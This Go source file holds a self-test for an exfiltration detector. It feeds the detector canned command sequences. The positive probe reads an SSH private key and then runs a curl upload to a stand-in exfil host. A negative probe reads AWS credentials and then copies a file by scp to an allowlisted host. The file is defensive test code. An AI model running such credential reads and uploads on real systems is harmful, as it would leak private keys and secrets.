// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Abysslink Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sentinel

import (
	"context"
	"fmt"
	"log/slog"
	"time"
)

// countingAppender counts fired detections without touching disk. It is the
// self-test's fire sink (a fired detection always attempts a Tier-0 audit
// append).
type countingAppender struct{ n int }

func (c *countingAppender) Append(_, _ string, _ []byte, _ bool) error {
	c.n++
	return nil
}

// SelfTest exercises the COMPILED rules end-to-end on a fresh engine with no
// config overlay. Kept for callers that only want to prove the shipped defaults
// are non-vacuous; the doctor check uses SelfTestWith to prove the LIVE config.
func SelfTest(ctx context.Context) error {
	return SelfTestWith(ctx, Config{})
}

// SelfTestWith exercises the rules end-to-end on a fresh engine built from cfg
// (Enabled is forced on so the probes run regardless of the operator's toggle):
// a canned ordered exfil pair MUST fire, and a canned benign sequence (registry
// egress with no preceding sensitive read; a lone external curl; a sensitive
// read with only an allowlisted tailnet egress) MUST stay silent. It returns a
// non-nil error describing the first broken invariant, so a doctor sec- check
// can prove the RUNNING detector — its actual windows, extra paths, and egress
// allowlist — is wired and non-vacuous without any host probe. A config that
// loosens the allowlist enough to swallow the canned exfil host makes the
// positive probe silent and this test fail, exactly as intended. It is hermetic
// and deterministic.
func SelfTestWith(_ context.Context, cfg Config) error {
	// Positive: a home-relative SSH private key read followed immediately by an
	// external, non-allowlisted curl upload — the canonical exfil pair.
	fires, err := replayCount(cfg, []probeEvent{
		{"cat", []string{"~/.ssh/id_ed25519"}},
		{"curl", []string{"-T", "/tmp/x", "https://exfil.example.net/u"}},
	})
	if err != nil {
		return err
	}
	if fires != 1 {
		return fmt.Errorf("sentinel self-test: the canonical exfil pair fired %d times, want exactly 1 — the detector is vacuous or broken (an over-broad egress_allowlist can cause this)", fires)
	}

	// Negative: a lone external curl with no preceding sensitive read, and a
	// sensitive read with only an allowlisted (tailnet) egress after it. Neither
	// may fire.
	fires, err = replayCount(cfg, []probeEvent{
		{"curl", []string{"https://example.org/index.html"}},
		{"cat", []string{"~/.aws/credentials"}},
		{"scp", []string{"/tmp/artifact", "buildhost.tail1234.ts.net:/tmp/"}},
	})
	if err != nil {
		return err
	}
	if fires != 0 {
		return fmt.Errorf("sentinel self-test: a benign sequence fired %d times, want 0 — the allowlist/ordering guard is broken", fires)
	}
	return nil
}

// probeEvent is one canned exec for the self-test replay.
type probeEvent struct {
	name string
	args []string
}

// replayCount replays events through a fresh engine built from cfg (Enabled
// forced on) and returns the number of fired detections.
func replayCount(cfg Config, events []probeEvent) (int, error) {
	cfg.Enabled = true
	sink := &countingAppender{}
	e := NewEngine(
		cfg,
		WithAudit(sink),
		WithLogger(slog.New(slog.DiscardHandler)),
		WithClock(func() time.Time { return time.Unix(0, 0) }),
	)
	if e == nil {
		return 0, fmt.Errorf("sentinel self-test: engine construction returned nil")
	}
	for _, ev := range events {
		e.observe(context.Background(), "SelfTest", ev.name, ev.args)
	}
	return sink.n, nil
}
